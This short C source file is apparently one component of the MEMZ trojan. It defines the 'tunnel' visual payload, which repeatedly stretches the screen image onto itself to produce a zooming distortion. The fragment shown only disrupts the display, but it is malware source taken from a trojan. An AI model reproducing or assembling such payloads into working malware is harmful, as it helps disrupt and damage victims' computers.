#include "../MEMZ.h"

PAYLOADFUNCTIONVISUAL(payloadTunnel) {
	PAYLOADHEAD

	StretchBlt(hdc, 50, 50, w - 10, h - 10, hdc, 0, 0, w, h, SRCCOPY);

	out: return 200.0 / (times / 1.0 + 1) + 4;
}
